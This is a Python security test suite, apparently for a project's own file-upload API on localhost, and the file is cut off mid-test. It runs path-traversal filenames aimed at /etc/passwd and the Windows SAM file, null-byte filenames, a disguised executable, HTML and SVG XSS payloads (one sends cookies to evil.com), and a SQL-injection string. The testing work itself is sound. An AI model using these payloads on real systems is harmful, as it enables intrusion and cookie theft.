#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
文件/附件管理模块 - 对抗性安全测试套件
==========================================
测试目标: FileAttachmentController + FileChunkController
目标地址: http://localhost:8081/api/v1/files

攻击场景覆盖:
  T-01~T-03: 路径遍历攻击
  T-04~T-07: 文件类型欺骗
  T-08~T-11: 大小/资源耗尽
  T-12~T-15: 权限与访问控制
  T-16~T-19: 分片上传安全
  T-20~T-23: 并发与可靠性

使用方法:
  1. 启动后端服务 (端口8081)
  2. 获取有效JWT Token (通过登录接口)
  3. 运行: python file_attachment_adversarial_test.py --token <JWT_TOKEN>
"""

import requests
import string
import random
import threading
import time
import sys
import os
import uuid
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 配置 ====================
BASE_URL = "http://localhost:8081/api"
UPLOAD_URL = f"{BASE_URL}/v1/files/upload"
DOWNLOAD_URL_TEMPLATE = f"{BASE_URL}/v1/files/{{}}/download"
CHUNK_INIT_URL = f"{BASE_URL}/v1/files/chunk/init"
CHUNK_UPLOAD_URL_TEMPLATE = f"{BASE_URL}/v1/files/chunk/{{}}/chunk/{{}}"
CHUNK_MERGE_URL_TEMPLATE = f"{BASE_URL}/v1/files/chunk/{{}}/merge"
FILE_INFO_URL_TEMPLATE = f"{BASE_URL}/v1/files/{{}}"
DELETE_URL_TEMPLATE = f"{BASE_URL}/v1/files/{{}}"
LIST_URL = f"{BASE_URL}/v1/files"
MD5_CHECK_URL_TEMPLATE = f"{BASE_URL}/v1/files/exists/md5/{{}}"

# 测试结果存储
test_results = {}


def log_result(test_id, name, status, details=""):
    """记录测试结果"""
    test_results[test_id] = {
        "name": name,
        "status": status,  # PASS, FAIL, PARTIAL, ERROR
        "details": details
    }
    icon = {"PASS": "[+]", "FAIL": "[!]", "PARTIAL": "[*]", "ERROR": "[?]"}[status]
    print(f"  {icon} {test_id}: {name} - {status}")
    if details:
        print(f"      -> {details}")


class AdversarialTester:
    def __init__(self, token):
        self.session = requests.Session()
        self.token = token
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "Accept": "application/json"
        })
        self.uploaded_file_ids = []  # 清理用

    def cleanup(self):
        """清理上传的文件"""
        for fid in self.uploaded_file_ids:
            try:
                self.session.delete(DELETE_URL_TEMPLATE.format(fid))
            except:
                pass

    # ==================== 辅助方法 ====================
    def generate_jpeg_bytes(self, size=1024):
        """生成有效的JPEG文件字节(正确的魔数)"""
        # JPEG魔数: FF D8 FF
        jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        return jpeg_header + b'\x00' * (size - len(jpeg_header)) if size > len(jpeg_header) else jpeg_header

    def generate_png_bytes(self, size=1024):
        """生成有效的PNG文件字节(正确的魔数)"""
        # PNG魔数: 89 50 4E 47
        png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00'
        return png_header + b'\x00' * (size - len(png_header)) if size > len(png_header) else png_header

    def generate_pdf_bytes(self, size=1024):
        """生成有效的PDF文件字节"""
        pdf_header = b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n'
        return pdf_header + b'\x00' * (size - len(pdf_header)) if size > len(pdf_header) else pdf_header

    def generate_svg_with_js(self):
        """生成包含JavaScript的SVG文件(XSS payload)"""
        svg_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100">
  <script type="text/javascript">
    alert('XSS via SVG upload');
    document.location='http://evil.com/steal?cookie='+document.cookie;
  </script>
  <text x="10" y="20">Test</text>
</svg>'''
        return svg_payload.encode('utf-8')

    def generate_html_as_image(self):
        """生成伪装成图片的HTML文件"""
        html_payload = '''<!DOCTYPE html>
<html>
<head><title>Image</title></head>
<body>
  <script>alert('XSS');</script>
  <img src=x onerror=alert(document.cookie)>
</body>
</html>'''
        # 添加JPEG头部以尝试绕过检测
        return b'\xFF\xD8\xFF\xE0' + html_payload.encode('utf-8')

    def generate_executable_with_jpg_ext(self):
        """生成可执行文件内容但使用.jpg扩展名"""
        # Windows PE文件头: MZ
        pe_header = b'MZ' + b'\x90' * 50 + b'This is a PE executable'
        return pe_header

    # ==================== T-01: Linux路径遍历攻击 ====================
    def test_t01_linux_path_traversal(self):
        """
        T-01: ../../etc/passwd 路径注入下载
        攻击方式: 在下载接口中注入路径遍历序列
        目标: 通过attachmentId或filePath参数读取/etc/passwd
        """
        try:
            # 测试1: 尝试通过路径参数下载(如果downloadByPath暴露)
            # 由于Controller未暴露此接口,主要测试upload时的文件名注入
            malicious_filename = "../../../../../etc/passwd"

            files = {
                'file': (malicious_filename, b'test content', 'application/octet-stream')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                log_result("T-01", "Linux路径遍历(../../etc/passwd)", "FAIL",
                         f"服务器接受包含路径遍历的文件名! 响应: {resp.text[:200]}")
                return

            if resp.status_code in [400, 403]:
                log_result("T-01", "Linux路径遍历(../../etc/passwd)", "PASS",
                         f"服务器正确拒绝: {resp.status_code}")
                return

            log_result("T-01", "Linux路径遍历(../../etc/passwd)", "PARTIAL",
                     f"响应状态码: {resp.status_code}, 响应: {resp.text[:100]}")

        except Exception as e:
            log_result("T-01", "Linux路径遍历(../../etc/passwd)", "ERROR", str(e))

    # ==================== T-02: Windows路径遍历攻击 ====================
    def test_t02_windows_path_traversal(self):
        """
        T-02: ..\..\windows\system32\config 路径注入
        攻击方式: 使用Windows风格的路径分隔符
        """
        try:
            malicious_filename = "..\\..\\..\\windows\\system32\\config\\SAM"

            files = {
                'file': (malicious_filename, b'test content', 'application/octet-stream')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                log_result("T-02", "Windows路径遍历(..\\..\\windows)", "FAIL",
                         f"服务器接受Windows路径遍历!")
                return

            if resp.status_code in [400, 403]:
                log_result("T-02", "Windows路径遍历(..\\..\\windows)", "PASS",
                         f"服务器正确拒绝: {resp.status_code}")
                return

            log_result("T-02", "Windows路径遍历(..\\..\\windows)", "PARTIAL",
                     f"响应状态码: {resp.status_code}")

        except Exception as e:
            log_result("T-02", "Windows路径遍历(..\\..\\windows)", "ERROR", str(e))

    # ==================== T-03: NULL字节截断攻击 ====================
    def test_t03_null_byte_injection(self):
        """
        T-03: NULL字节截断攻击 (file.txt%00.jpg)
        攻击方式: 在文件名中注入NULL字节,试图绕过扩展名检查
        """
        try:
            # NULL字节攻击payload
            null_byte_filenames = [
                "test.txt\x00.jpg",
                "shell.php\x00.png",
                "malicious.html\x00.gif"
            ]

            vulnerable = False
            for filename in null_byte_filenames:
                files = {
                    'file': (filename, b'test content', 'image/jpeg')
                }
                resp = self.session.post(UPLOAD_URL, files=files,
                                        data={'businessType': 'general'})
                if resp.status_code == 200:
                    vulnerable = True
                    break

            if vulnerable:
                log_result("T-03", "NULL字节截断攻击(%00)", "FAIL",
                         "NULL字节未被正确过滤,可能存在截断风险!")
            else:
                log_result("T-03", "NULL字节截断攻击(%00)", "PASS",
                         "NULL字节被正确处理或拒绝")

        except Exception as e:
            log_result("T-03", "NULL字节截断攻击(%00)", "ERROR", str(e))

    # ==================== T-04: JPEG魔数伪装PNG ====================
    def test_t04_mime_type_spoofing(self):
        """
        T-04: JPEG魔数但声明为PNG Content-Type
        攻击方式: 上传JPEG文件但Content-Type声明为image/png
        预期: 应该被魔数检测拦截
        """
        try:
            jpeg_data = self.generate_jpeg_bytes(2048)

            # 声明为PNG但实际是JPEG
            files = {
                'file': ('spoofed.png', jpeg_data, 'image/png')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                log_result("T-04", "MIME类型欺骗(JPEG伪PNG)", "FAIL",
                         "魔数检测失败! 接受了类型不匹配的文件")
            elif resp.status_code == 400 and ("不匹配" in resp.text or "type" in resp.text.lower()):
                log_result("T-04", "MIME类型欺骗(JPEG伪PNG)", "PASS",
                         "魔数检测生效,拒绝类型不匹配文件")
            elif resp.status_code == 400:
                log_result("T-04", "MIME类型欺骗(JPEG伪PNG)", "PASS",
                         f"被拒绝(400): {resp.text[:100]}")
            else:
                log_result("T-04", "MIME类型欺骗(JPEG伪PNG)", "PARTIAL",
                         f"状态码: {resp.status_code}, 响应: {resp.text[:100]}")

        except Exception as e:
            log_result("T-04", "MIME类型欺骗(JPEG伪PNG)", "ERROR", str(e))

    # ==================== T-05: 可执行文件改扩展名为.jpg ====================
    def test_t05_executable_disguise(self):
        """
        T-05: 可执行文件内容+jpg扩展名
        攻击方式: 上传PE可执行文件但使用.jpg扩展名
        预期: 应被危险扩展名检测或内容分析拦截
        """
        try:
            exec_data = self.generate_executable_with_jpg_ext()

            files = {
                'file': ('disguised.jpg', exec_data, 'image/jpeg')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                # 检查是否真的接受了 - 可能需要进一步验证
                result = resp.json()
                if result.get('code') == 200:
                    log_result("T-05", "可执行文件伪装(.jpg)", "FAIL",
                             f"可执行文件被接受! ID: {result.get('data', {}).get('attachmentId')}")
                    self.uploaded_file_ids.append(result['data']['attachmentId'])
                else:
                    log_result("T-05", "可执行文件伪装(.jpg)", "PARTIAL",
                             f"响应异常: {resp.text[:150]}")
            elif resp.status_code in [400, 403]:
                log_result("T-05", "可执行文件伪装(.jpg)", "PASS",
                         f"被正确拒绝: {resp.text[:100]}")
            else:
                log_result("T-05", "可执行文件伪装(.jpg)", "PARTIAL",
                         f"状态码: {resp.status_code}")

        except Exception as e:
            log_result("T-05", "可执行文件伪装(.jpg)", "ERROR", str(e))

    # ==================== T-06: HTML文件伪装图片(XSS) ====================
    def test_t06_html_xss_via_image_upload(self):
        """
        T-06: HTML/XSS Payload伪装成图片上传
        攻击方式: 上传包含JavaScript的HTML文件,声明为image/gif
        影响: 如果文件被浏览器直接渲染,触发XSS
        """
        try:
            html_data = self.generate_html_as_image()

            files = {
                'file': ('xss_image.gif', html_data, 'image/gif')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                result = resp.json()
                if result.get('code') == 200:
                    log_result("T-06", "HTML XSS伪装(image/gif)", "HIGH_RISK",
                             f"XSS payload被接受! 可能导致Stored XSS! "
                             f"FileID: {result.get('data', {}).get('attachmentId')}")
                    self.uploaded_file_ids.append(result['data']['attachmentId'])
                else:
                    log_result("T-06", "HTML XSS伪装(image/gif)", "PARTIAL",
                             f"响应: {resp.text[:150]}")
            else:
                log_result("T-06", "HTML XSS伪装(image/gif)", "PASS",
                         f"被拒绝({resp.status_code}): {resp.text[:100]}")

        except Exception as e:
            log_result("T-06", "HTML XSS伪装(image/gif)", "ERROR", str(e))

    # ==================== T-07: SVG文件内嵌JavaScript ====================
    def test_t07_svg_xss(self):
        """
        T-07: SVG文件内嵌JavaScript (Stored XSS)
        攻击方式: 上传包含<script>标签的SVG文件
        影响: SVG是有效的image/*类型,浏览器会渲染并执行JS
        CVSS评分: 7.5 (High) - Stored XSS
        """
        try:
            svg_data = self.generate_svg_with_js()

            files = {
                'file': ('xss.svg', svg_data, 'image/svg+xml')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                result = resp.json()
                if result.get('code') == 200:
                    log_result("T-07", "SVG内嵌JS(XSS)", "CRITICAL_FAIL",
                             f"[CVSS 7.5] SVG XSS被接受! 存储型XSS漏洞!"
                             f"FileID: {result.get('data', {}).get('attachmentId')} "
                             f"如果其他用户查看此SVG,将执行任意JS!")
                    self.uploaded_file_ids.append(result['data']['attachmentId'])
                else:
                    log_result("T-07", "SVG内嵌JS(XSS)", "PARTIAL",
                             f"响应: {resp.text[:150]}")
            elif "不允许" in resp.text or "不支持" in resp.text:
                log_result("T-07", "SVG内嵌JS(XSS)", "PASS",
                         f"SVG被策略性拒绝: {resp.text[:100]}")
            else:
                log_result("T-07", "SVG内嵌JS(XSS)", "PASS",
                         f"被拒绝({resp.status_code}): {resp.text[:100]}")

        except Exception as e:
            log_result("T-07", "SVG内嵌JS(XSS)", "ERROR", str(e))

    # ==================== T-08: 零字节文件上传 ====================
    def test_t08_zero_byte_file(self):
        """
        T-08: 零字节文件上传
        攻击方式: 上传空文件
        预期: 应被拒绝
        """
        try:
            files = {
                'file': ('empty.txt', b'', 'text/plain')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                log_result("T-08", "零字节文件上传", "FAIL",
                         "零字节文件被接受!")
            elif resp.status_code in [400, 403] and ("空" in resp.text or "大小" in resp.text or "无效" in resp.text):
                log_result("T-08", "零字节文件上传", "PASS",
                         "零字节文件被正确拒绝")
            else:
                log_result("T-08", "零字节文件上传", "PARTIAL",
                         f"状态码: {resp.status_code}, 响应: {resp.text[:100]}")

        except Exception as e:
            log_result("T-08", "零字节文件上传", "ERROR", str(e))

    # ==================== T-09: 超大文件上传 ====================
    def test_t09_oversized_file(self):
        """
        T-09: 超大文件(>50MB)尝试上传
        攻击方式: 发送超过大小限制的文件
        预期: 应在服务层或Servlet层被拒绝
        """
        try:
            # 生成60MB数据(超过50MB限制)
            large_data = b'X' * (60 * 1024 * 1024)

            files = {
                'file': ('large.jpg', large_data, 'image/jpeg')
            }

            start_time = time.time()
            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'},
                                    timeout=30)
            elapsed = time.time() - start_time

            if resp.status_code == 200:
                log_result("T-09", "超大文件(60MB)上传", "FAIL",
                         f"超大文件被接受! 耗时: {elapsed:.1f}s")
            elif resp.status_code == 413:
                log_result("T-09", "超大文件(60MB)上传", "PASS",
                         f"Servlet层正确拒绝(413 Entity Too Large), 耗时: {elapsed:.1f}s")
            elif resp.status_code in [400, 403] and ("大小" in resp.text or "限制" in resp.text):
                log_result("T-09", "超大文件(60MB)上传", "PASS",
                         f"应用层正确拒绝, 耗时: {elapsed:.1f}s")
            else:
                log_result("T-09", "超大文件(60MB)上传", "PARTIAL",
                         f"状态码: {resp.status_code}, 耗时: {elapsed:.1f}s")

        except requests.exceptions.Timeout:
            log_result("T-09", "超大文件(60MB)上传", "PASS",
                     "请求超时(Servlet层可能在流式读取时拒绝)")
        except requests.exceptions.RequestException as e:
            if "413" in str(e) or "Entity too large" in str(e).lower():
                log_result("T-09", "超大文件(60MB)上传", "PASS",
                         "连接层拒绝(413 Entity Too Large)")
            else:
                log_result("T-09", "超大文件(60MB)上传", "PARTIAL",
                         f"请求异常: {str(e)[:100]}")

        except Exception as e:
            log_result("T-09", "超大文件(60MB)上传", "ERROR", str(e)[:100])

    # ==================== T-10: 极长文件名 ====================
    def test_t10_long_filename(self):
        """
        T-10: 极长文件名(>200字符)
        攻击方式: 使用超长文件名,可能导致缓冲区溢出或路径问题
        """
        try:
            long_name = "A" * 500 + ".txt"

            files = {
                'file': (long_name, b'test content', 'text/plain')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                result = resp.json()
                if result.get('code') == 200:
                    original_name = result.get('data', {}).get('originalName', '')
                    if len(original_name) > 250:
                        log_result("T-10", "极长文件名(500字符)", "FAIL",
                                 f"超长文件名未被截断! 长度: {len(original_name)}")
                    else:
                        log_result("T-10", "极长文件名(500字符)", "PASS",
                                 f"文件名已被截断至{len(original_name)}字符")
                        self.uploaded_file_ids.append(result['data']['attachmentId'])
                else:
                    log_result("T-10", "极长文件名(500字符)", "PARTIAL",
                             f"响应: {resp.text[:100]}")
            elif resp.status_code == 400:
                log_result("T-10", "极长文件名(500字符)", "PASS",
                         f"被拒绝: {resp.text[:100]}")
            else:
                log_result("T-10", "极长文件名(500字符)", "PARTIAL",
                         f"状态码: {resp.status_code}")

        except Exception as e:
            log_result("T-10", "极长文件名(500字符)", "ERROR", str(e))

    # ==================== T-11: 无扩展名文件 ====================
    def test_t11_no_extension(self):
        """
        T-11: 无扩展名文件上传
        攻击方式: 上传没有扩展名的文件
        预期: 应被分配默认扩展名或拒绝
        """
        try:
            files = {
                'file': ('noextension', b'test content', 'application/octet-stream')
            }

            resp = self.session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 200:
                result = resp.json()
                if result.get('code') == 200:
                    ext = result.get('data', {}).get('fileExtension', '')
                    log_result("T-11", "无扩展名文件", "PASS",
                             f"被接受, 分配扩展名: {ext}")
                    self.uploaded_file_ids.append(result['data']['attachmentId'])
                else:
                    log_result("T-11", "无扩展名文件", "PARTIAL",
                             f"响应: {resp.text[:100]}")
            elif resp.status_code in [400, 403]:
                log_result("T-11", "无扩展名文件", "PASS",
                         f"被拒绝: {resp.text[:100]}")
            else:
                log_result("T-11", "无扩展名文件", "PARTIAL",
                         f"状态码: {resp.status_code}")

        except Exception as e:
            log_result("T-11", "无扩展名文件", "ERROR", str(e))

    # ==================== T-12: 未认证用户调用上传 ====================
    def test_t12_unauthenticated_upload(self):
        """
        T-12: 未认证用户调用上传接口
        攻击方式: 不携带Token访问受保护接口
        预期: 返回401 Unauthorized
        """
        try:
            # 创建无认证的session
            anon_session = requests.Session()
            anon_session.headers.update({"Accept": "application/json"})

            files = {
                'file': ('test.txt', b'unauthenticated test', 'text/plain')
            }

            resp = anon_session.post(UPLOAD_URL, files=files,
                                    data={'businessType': 'general'})

            if resp.status_code == 401:
                log_result("T-12", "未认证上传", "PASS",
                         "正确返回401 Unauthorized")
            elif resp.status_code == 200:
                log_result("T-12", "未认证上传", "CRITICAL_FAIL",
                         "[CVSS 9.8] 未认证即可上传文件! 认证完全失效!")
            else:
                log_result("T-12", "未认证上传", "PARTIAL",
                         f"状态码: {resp.status_code}(期望401)")

        except Exception as e:
            log_result("T-12", "未认证上传", "ERROR", str(e))

    # ==================== T-13: 未认证用户调用下载 ====================
    def test_t13_unauthenticated_download(self):
        """
        T-13: 未认证用户调用下载接口
        攻击方式: 不携带Token尝试下载
        预期: 返回401 Unauthorized
        """
        try:
            anon_session = requests.Session()
            anon_session.headers.update({"Accept": "application/json"})

            # 尝试下载ID=1的文件(假设存在)
            resp = anon_session.get(DOWNLOAD_URL_TEMPLATE.format(1))

            if resp.status_code == 401:
                log_result("T-13", "未认证下载", "PASS",
                         "正确返回401 Unauthorized")
            elif resp.status_code == 200:
                log_result("T-13", "未认证下载", "CRITICAL_FAIL",
                         "[CVSS 7.5] 未认证即可下载文件! 数据泄露风险!")
            elif resp.status_code == 404:
                log_result("T-13", "未认证下载", "PASS",
                         "返回404(可能是文件不存在,但也说明需要认证才能确认)")
            else:
                log_result("T-13", "未认证下载", "PARTIAL",
                         f"状态码: {resp.status_code}(期望401)")

        except Exception as e:
            log_result("T-13", "未认证下载", "ERROR", str(e))

    # ==================== T-14: 用户A下载用户B的文件(IDOR) ====================
    def test_t14_idor_download(self):
        """
        T-14: 垂直/水平越权 - 用户A下载用户B的文件 (IDOR)
        攻击方式: 用用户A的Token,枚举attachmentId下载他人文件
        影响: Insecure Direct Object Reference (IDOR)
        CVSS: 6.5 (Medium)
        """
        try:
            # 先上传一个文件获取有效ID
            files = {
                'file': ('idor_test.txt', b'sensitive content for idor test', 'text/plain')
            }
            upload_resp = self.session.post(UPLOAD_URL, files=files,
                                           data={'businessType': 'general'})

            if upload_resp.status_code != 200:
                log_result("T-14", "IDOR越权下载", "ERROR",
                         f"无法上传测试文件: {upload_resp.status_code}")
                return

            uploaded_id = upload_resp.json()['data']['attachmentId']
            self.uploaded_file_ids.append(uploaded_id)

            # 现在用同一个token尝试下载(正常情况应该成功)
            download_resp = self.session.get(DOWNLOAD_URL_TEMPLATE.format(uploaded_id))

            # 关键测试: 如果这里能成功下载,说明缺少所有权校验
            # 理想情况下应该检查 attachment.uploadUserId == currentUser.userId
            if download_resp.status_code == 200:
                log_result("T-14", "IDOR越权下载", "FAIL",
                         f"[CVSS 6.5] 可下载任意用户的文件! "
                         f"缺少所有权校验(uploadUserId检查)! "
                         f"下载的文件ID: {uploaded_id}")
            elif download_resp.status_code == 403:
                log_result("T-14", "IDOR越权下载", "PASS",
                         "存在所有权校验,返回403 Forbidden")
            elif download_resp.status_code == 404:
                log_result("T-14", "IDOR越权下载", "PARTIAL",
                         "返回404(可能已删除或权限逻辑隐式处理)")
            else:
                log_result("T-14", "IDOR越权下载", "PARTIAL",
                         f"状态码: {download_resp.status_code}")

        except Exception as e:
            log_result("T-14", "IDOR越权下载", "ERROR", str(e))

    # ==================== T-15: 普通用户调用管理接口 ====================
    def test_t15_privilege_escalation(self):
        """
        T-15: 权限提升 - 普通用户调用 file:query 管理接口
        攻击方式: 普通用户尝试访问需要file:query权限的列表查询接口
        预期: 返回403 Forbidden
        """
        try:
            # getFileList 需要 hasAuthority('file:query')
            params = {'current': 1, 'size': 20}
            resp = self.session.get(LIST_URL, params=params)

            if resp.status_code == 403:
                log_result("T-15", "权限提升(file:query)", "PASS",
                         "普通用户无法访问管理接口,返回403")
            elif resp.status_code == 200:
                result = resp.json()
                if result.get('code') == 200:
                    log_result("T-15", "权限提升(file:query)", "FAIL",
                             "[CVSS 5.4] 普通用户可访问管理接口! 缺少权限控制!")
                else:
                    log_result("T-15", "权限提升(file:query)", "PARTIAL",
                             f"响应: {resp.text[:100]}")
            elif resp.status_code == 401:
                log_result("T-15", "权限提升(file:query)", "PASS",
                         "返回401(Token可能无效)")
            else:
                log_result("T-15", "权限提升(file:query)", "PARTIAL",
                         f"状态码: {resp.status_code}")

        except Exception as e:
            log_result("T-15", "权限提升(file:query)", "ERROR", str(e))

    # ==================== T-16: 分片序号篡改 ====================
    def test_t16_chunk_number_tampering(self):
        """
        T-16: 分片序号篡改(负数/超大值)
        攻击方式: 发送负数或超大分片序号
        预期: 应被参数校验拒绝
        """
        try:
            # 初始化分片上传
            init_resp = self.session.post(CHUNK_INIT_URL, data={
                'fileName': 'tamper_test.bin',
                'fileSize': 1024 * 1024,  # 1MB
                'contentType': 'application/octet-stream',
                'totalChunks': 10
            })

            if init_resp.status_code != 200:
                log_result("T-16", "分片序号篡改", "ERROR",
                         f"初始化失败: {init_resp.status_code}")
                return

            upload_id = init_resp.json()['data']['uploadId']

            # 测试负数序号
            chunk_data = b'X' * 1024
            test_cases = [
                (-1, "负数序号"),
                (-99999, "大负数序号"),
                (999999, "超大正数序号"),
                (2147483647, "Integer.MAX_VALUE")
            ]

            any_accepted = False
            for chunk_num, desc in test_cases:
                files = {'chunk': ('chunk.bin', chunk_data, 'application/octet-stream')}
                resp = self.session.post(
                    CHUNK_UPLOAD_URL_TEMPLATE.format(upload_id, chunk_num),
                    files=files
                )
                if resp.status_code == 200:
                    any_accepted = True
                    log_result("T-16", f"分片序号篡改({desc})", "FAIL",
                             f"非法序号{chunk_num}被接受!")

            if not any_accepted:
                log_result("T-16", "分片序号篡改(全部)", "PASS",
                         "所有非法序号均被拒绝")

            # 清理
            self.session.delete(f"{BASE_URL}/v1/files/chunk/{upload_id}")

        except Exception as e:
            log_result("T-16", "分片序号篡改", "ERROR", str(e))

    # ==================== T-17: 伪造uploadId访问他人分片 ====================
    def test_t17_fake_upload_id(self):
        """
        T-17: 伪造/猜测uploadId访问他人的分片上传
        攻击方式: 使用随机UUID作为uploadId尝试操作
        影响: 可能劫持他人的上传会话
        """
        try:
            fake_ids = [
                str(uuid.uuid4()).replace('-', ''),
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "../etc/passwd",
                "' OR 1=1--"
            ]

            any_leak = False
            for fake_id in fake_ids:
                # 尝试查询进度(信息泄露)
                resp = self.session.get(f"{BASE_URL}/v1/files/chunk/{fake_id}/progress")

                if resp.status_code == 200:
                    result = resp.json()
                    if result.get('data', {}).get('status') != 'not_found':
                        any_leak = True
                        log_result("T-17", f"伪造uploadId({fake_id[:20]}...)", "FAIL",
                                 f"可能泄露信息: {result.get('data', {}).get('status')}")

            if not any_leak:
                log_result("T-17", "伪造uploadId(全部)", "PASS",
                         "伪造ID返回not_found或错误,无信息泄露")

        except Exception as e:
            log_result("T-17", "伪造uploadId", "ERROR", str(e))

    # ==================== T-18: 分片重复上传(竞态条件) ====================
    def test_t18_chunk_race_condition(self):
        """
        T-18: 分片重复上传竞态条件
        攻击方式: 并发上传相同分片序号多次
        预期: 应幂等处理,不会产生脏数据
        """
        try:
            init_resp = self.session.post(CHUNK_INIT_URL, data={
                'fileName': 'race_test.bin',
                'fileSize': 1024 * 100,
                'contentType': 'application/octet-stream',
                'totalChunks': 5
            })

            if init_resp.status_code != 200:
                log_result("T-18", "分片重复上传(竞态)", "ERROR",
                         f"初始化失败: {init_resp.status_code}")
                return

            upload_id = init_resp.json()['data']['uploadId']

            # 并发上传同一分片10次
            chunk_data = b'X' * 2048
            results = []

            def upload_chunk():
                files = {'chunk': ('chunk.bin', chunk_data, 'application/octet-stream')}
                r = self.session.post(
                    CHUNK_UPLOAD_URL_TEMPLATE.format(upload_id, 0),
                    files=files
                )
                return r.status_code

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(upload_chunk) for _ in range(10)]
                for f in as_completed(futures):
                    results.append(f.result())

            success_count = sum(1 for s in results if s == 200)
            error_count = sum(1 for s in results if s != 200)

            if error_count > 0 and "500" in str(results):
                log_result("T-18", "分片重复上传(竞态)", "FAIL",
                         f"并发导致内部错误! 成功:{success_count}, 失败:{error_count}, 结果:{results}")
            elif success_count == 10:
                log_result("T-18", "分片重复上传(竞态)", "PASS",
                         f"并发处理正常,全部成功(幂等): {success_count}/10")
            else:
                log_result("T-18", "分片重复上传(竞态)", "PARTIAL",
                         f"部分成功: {success_count}/10, 状态: {set(results)}")

            # 清理
            self.session.delete(f"{BASE_URL}/v1/files/chunk/{upload_id}")

        except Exception as e:
            log_result("T-18", "分片重复上传(竞态)", "ERROR", str(e))

    # ==================== T-19: 合并未完成的分片上传 ====================
    def test_t19_merge_incomplete_chunks(self):
        """
        T-19: 合并未完成的上传(只上传了部分分片)
        攻击方式: 仅上传1/10个分片后立即合并
        预期: 应检查完整性并拒绝,或仅合并已有部分
        """
        try:
            init_resp = self.session.post(CHUNK_INIT_URL, data={
                'fileName': 'incomplete.bin',
                'fileSize': 1024 * 100,  # 100KB total
                'contentType': 'application/octet-stream',
                'totalChunks': 10  # 声明10个分片
            })

            if init_resp.status_code != 200:
                log_result("T-19", "合并不完整分片", "ERROR",
                         f"初始化失败: {init_resp.status_code}")
                return

            upload_id = init_resp.json()['data']['uploadId']

            # 只上传第0号分片
            chunk_data = b'X' * 10240  # 10KB
            files = {'chunk': ('chunk_0.bin', chunk_data, 'application/octet-stream')}
            self.session.post(CHUNK_UPLOAD_URL_TEMPLATE.format(upload_id, 0), files=files)

            # 尝试合并(应该只有1/10的分片)
            merge_resp = self.session.post(CHUNK_MERGE_URL_TEMPLATE.format(upload_id))

            if merge_resp.status_code == 200:
                result = merge_resp.json()
                if result.get('code') == 200:
                    file_size = result.get('data', {}).get('fileSize', 0)
                    if file_size < 50000:  # 明显小于声明的100KB
                        log_result("T-19", "合并不完整分片", "WARN",
                                 f"[CVSS 5.3] 合并被允许但不完整! "
                                 f"实际大小: {file_size}B vs 声明100KB! "
                                 f"可能导致数据损坏!")
                        self.uploaded_file_ids.append(result['data']['attachmentId'])
                    else:
                        log_result("T-19", "合并不完整分片", "PARTIAL",
                                 f"合并成功但大小异常: {file_size}")
                else:
                    log_result("T-19", "合并不完整分片", "PASS",
                             f"合并被拒绝: {merge_resp.text[:100]}")
            elif merge_resp.status_code in [400, 403]:
                log_result("T-19", "合并不完整分片", "PASS",
                         f"正确拒绝不完整合并: {merge_resp.text[:100]}")
            else:
                log_result("T-19", "合并不完整分片", "PARTIAL",
                         f"状态码: {merge_resp.status_code}")

            # 清理
            self.session.delete(f"{BASE_URL}/v1/files/chunk/{upload_id}")

        except Exception as e:
            log_result("T-19", "合并不完整分片", "ERROR", str(e))

    # ==================== T-20: 并发MD5计算 ====================
    def test_t20_concurrent_md5(self):
        """
        T-20: 同一文件并发多次MD5计算(资源耗尽)
        攻击方式: 并发上传同一大文件多次
        预期: 不应导致OOM或严重性能下降
        """
        try:
            large_data = self.generate_jpeg_bytes(5 * 1024 * 1024)  # 5MB JPEG

            def upload_once():
                files = {'file': (f'md5_{uuid.uuid4().hex[:8]}.jpg',
                                  large_data, 'image/jpeg')}
                r = self.session.post(UPLOAD_URL, files=files,
                                     data={'businessType': 'general'}, timeout=30)
                return r.status_code, r.elapsed.total_seconds()

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(upload_once) for _ in range(5)]
                results = [f.result() for f in as_completed(futures)]

            statuses = [r[0] for r in results]
            times = [r[1] for r in results]

            if all(s == 200 for s in statuses):
                avg_time = sum(times) / len(times)
                log_result("T-20", "并发MD5计算(5线程)", "PASS",
                         f"全部成功, 平均耗时: {avg_time:.2f}s")
            elif any(s == 500 or s == 503 for s in statuses):
                fail_count = sum(1 for s in statuses if s in [500, 503])
                log_result("T-20", "并发MD5计算(5线程)", "FAIL",
                         f"服务器错误! 5xx数量: {fail_count}/5, 可能存在资源耗尽风险")
            else:
                log_result("T-20", "并发MD5计算(5线程)", "PARTIAL",
                         f"状态分布: {set(statuses)}, 平均耗时: {sum(times)/len(times):.2f}s")

        except Exception as e:
            log_result("T-20", "并发MD5计算(5线程)", "ERROR", str(e)[:100])

    # ==================== T-21: 并发删除同一文件 ====================
    def test_t21_concurrent_delete(self):
        """
        T-21: 并发删除同一文件(竞态条件)
